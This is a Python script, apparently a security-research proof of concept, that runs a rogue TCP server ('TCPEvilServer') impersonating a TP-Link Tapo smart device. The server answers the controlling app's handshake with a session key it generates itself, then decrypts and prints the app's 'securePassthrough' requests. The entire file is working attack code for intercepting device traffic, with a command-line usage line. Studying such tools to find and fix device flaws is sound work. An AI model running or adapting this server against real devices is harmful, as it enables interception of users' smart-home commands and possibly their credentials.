#!/usr/bin/env python3

import sys
import os
sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '..')))

from commons.properties import *
from commons.functions import *
from commons.TpLinkAESCipher import *
from commons.TapoUtils import *

##############

import json
import socketserver

if(len(sys.argv) < 2):
    print("Usage: python3 script.py [device_type]")
    exit(1)

TapoDevice = instantiate_class_from_text(sys.argv[1])

class TCPEvilServer(socketserver.BaseRequestHandler):
    AES = None

    def handshake(self, payload):
        tapoUtils = TapoUtils(
            TapoDevice.ip,
            payload["params"]["key"].encode()
        )

        key_rec, cookie = tapoUtils.get_random_key_and_cookie()
        enc_key = tapoUtils.rsa_encrypt(key_rec)
            
        json_payload = json.dumps(
           {"error_code":0,"result":{"key":enc_key.decode()}},
            separators=(',', ':')
        )
        header =  "".join([
            'HTTP/1.1 200 OK\r\nContent-Type: application/json;charset=UTF-8\r\nContent-Length: 208\r\nConnection: close\r\nSet-Cookie: ',
            cookie,
            ';TIMEOUT=1440\r\n\r\n'
        ])

        self.request.sendall(header.encode())
        self.request.sendall(json_payload.encode())

        TCPEvilServer.AES = TpLinkAESCipher(
            _key=key_rec[:16], 
            _iv=key_rec[16:]
        )

    def handle(self):

        data = self.request.recv(1024).strip()
        print(f"DEBUG {data} END...")

        payload = json.loads(data.split(b"\r\n\r\n")[1])

        if payload["method"] == "handshake":
            self.handshake(payload)
        elif payload["method"] == "securePassthrough":
            print(TCPEvilServer.AES.decrypt(payload["params"]["request"]))
        else:
            print("** method not found")
        
        print("\n")

if __name__ == "__main__":
    HOST, PORT = "0.0.0.0",Evil.tcp_port

    print(f"Starting server at {HOST}:{PORT} ...")

    socketserver.TCPServer.allow_reuse_address = True
    with socketserver.TCPServer((HOST, PORT), TCPEvilServer) as server:
        server.serve_forever()
